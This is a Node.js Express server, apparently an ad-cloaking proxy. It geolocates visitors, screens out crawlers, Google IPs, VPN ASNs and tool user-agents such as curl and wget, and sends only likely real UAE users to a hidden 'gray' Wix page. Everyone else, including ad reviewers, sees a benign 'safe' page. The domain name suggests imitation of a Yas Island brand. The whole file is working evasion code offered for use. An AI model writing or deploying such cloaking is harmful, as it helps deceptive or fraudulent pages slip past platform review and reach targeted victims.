const express = require("express");
const app = express();
const axios = require("axios");
const dns = require("dns");
const fs = require("fs");
const csv = require("csv-parser");
const requestIp = require("request-ip");

// --- Configuration ---
const PORT = process.env.PORT || 10000;
const SAFE_PAGE = process.env.SAFE_PAGE || "https://yasislandemiratis.wixstudio.com/website-3/seaha";
const GRAY_PAGE = process.env.GRAY_PAGE || "https://yasislandemiratis.wixstudio.com/website-3/emaratise";
const UAE_COUNTRY_CODE = "AE";

// --- Trust proxy for correct IP detection ---
app.set("trust proxy", true);

// --- Bot Keywords ---
const BOT_KEYWORDS = [ /* كما هي بدون تغيير */ 
  "adsbot", "googlebot", "mediapartners-google", "bingbot", "yandexbot", "baiduspider",
  "crawler", "spider", "render", "wget", "curl", "python-requests", "node-fetch",
  "monitor", "uptimerobot", "pingdom", "gtmetrix", "lighthouse", "facebookexternalhit",
  "slackbot", "telegrambot", "discordbot", "preview", "ahrefsbot", "semrushbot", "mj12bot",
  "dotbot", "petalbot", "rogerbot", "exabot", "sitecheckerbot", "screaming frog",
  "netcraftsurvey", "prerender", "headlesschrome", "bot", "scanner", "analyzer",
  "validator", "parser", "scraper"
];

// --- Suspicious User-Agents ---
const SUSPICIOUS_AGENTS = [
  "headlesschrome", "phantomjs", "puppeteer", "axios", "curl", "fetch", "python"
];

// --- Load Blocked ASN List from CSV ---
let blockedASNList = [];

fs.createReadStream("vpn_asn_list.csv")
  .pipe(csv())
  .on("data", (row) => {
    blockedASNList.push({
      asn: row["ASN"].trim().toUpperCase(),
      orgName: row["OrgName"].toLowerCase(),
    });
  })
  .on("end", () => {
    console.log(`✅ تم تحميل ${blockedASNList.length} من ASN المحظور`);
  });

// --- Check if ASN is blocked ---
function isBlockedASN(asn, orgName) {
  if (!asn || !orgName) return false;

  const cleanASN = asn.trim().toUpperCase();
  const cleanOrg = orgName.toLowerCase();

  return blockedASNList.some(entry =>
    entry.asn === cleanASN || cleanOrg.includes(entry.orgName)
  );
}

// --- Bot Detection ---
async function isBot(req) {
  const ua = (req.headers["user-agent"] || "").toLowerCase();
  const ip = req.clientIp || req.ip;
  if (BOT_KEYWORDS.some(bot => ua.includes(bot))) return true;

  const hasHeaders = req.headers["accept"] && req.headers["accept-language"] && req.headers["accept-encoding"];
  if (!hasHeaders) return true;

  return await isGoogleRelatedIP(ip);
}

// --- Check Google IP via DNS ---
async function isGoogleRelatedIP(ip) {
  return new Promise(resolve => {
    if (!ip) return resolve(false);
    dns.reverse(ip, (err, hostnames) => {
      if (err) return resolve(false);
      resolve(hostnames.some(h =>
        h.endsWith(".googlebot.com") || h.endsWith(".google.com") || h.endsWith(".googleusercontent.com")
      ));
    });
  });
}

// --- Check Real User ---
function isLikelyRealUser(req) {
  const ua = (req.headers["user-agent"] || "").toLowerCase();
  const headers = req.headers;
  const basicHeaders = headers["accept"] && headers["accept-language"] && headers["accept-encoding"];
  const isSuspicious = SUSPICIOUS_AGENTS.some(key => ua.includes(key));
  const hasReferrer = headers["referer"] || headers["referrer"];
  return (
    ua.includes("mozilla") &&
    basicHeaders &&
    !ua.includes("bot") &&
    !ua.includes("google") &&
    !isSuspicious &&
    hasReferrer
  );
}

// --- Proxy Content ---
async function proxyContent(targetUrl, req, res) {
  try {
    const response = await axios({
      method: req.method,
      url: targetUrl + req.url,
      responseType: "stream",
      headers: {
        "User-Agent": req.headers["user-agent"],
        "Accept": req.headers["accept"],
        "Accept-Encoding": req.headers["accept-encoding"],
        "Accept-Language": req.headers["accept-language"],
      },
      data: req.body,
      validateStatus: () => true
    });

    for (const key in response.headers) {
      if (!["connection", "keep-alive", "proxy-authenticate", "proxy-authorization", "te", "trailers", "transfer-encoding", "upgrade", "host"].includes(key.toLowerCase())) {
        res.setHeader(key, response.headers[key]);
      }
    }

    res.status(response.status);
    response.data.pipe(res);
  } catch (error) {
    console.error(`❌ Proxy error:`, error.message);
    res.status(500).send("Internal Server Error");
  }
}

// --- Middleware ---
app.use(requestIp.mw());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// --- Route Handler ---
app.all("*", async (req, res) => {
  const ip = req.clientIp || req.ip || "no-ip";
  const ua = req.headers["user-agent"] || "no-agent";
  const referrer = req.headers["referer"] || req.headers["referrer"] || "none";

  let countryCode = null, asn = null, orgName = null;

  try {
    const geo = await axios.get(`https://ipapi.co/${ip}/json/`);
    countryCode = geo.data.country_code;
    asn = geo.data.asn;
    orgName = geo.data.org;
    console.log(`🌍 IP Info - ${ip} | ${countryCode} | ${asn} | ${orgName}`);
  } catch (err) {
    console.error(`GeoIP lookup failed:`, err.message);
  }

  const isFromUAE = countryCode === UAE_COUNTRY_CODE;
  const isDetectedBot = await isBot(req);
  const isRealUser = isLikelyRealUser(req);
  const isASNBlocked = isBlockedASN(asn, orgName);

  console.log(`🧠 Decision: IP=${ip} | FromUAE=${isFromUAE} | Bot=${isDetectedBot} | RealUser=${isRealUser} | ASNBlocked=${isASNBlocked}`);

  await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 500) + 100));

  if (isFromUAE && !isDetectedBot && isRealUser && !isASNBlocked) {
    console.log("✅ Redirecting to GRAY_PAGE");
    await proxyContent(GRAY_PAGE, req, res);
  } else {
    console.log("🔒 Redirecting to SAFE_PAGE");
    await proxyContent(SAFE_PAGE, req, res);
  }
});

// --- Start Server ---
app.listen(PORT, () => {
  console.log(`🚀 Server started on port ${PORT}`);
});
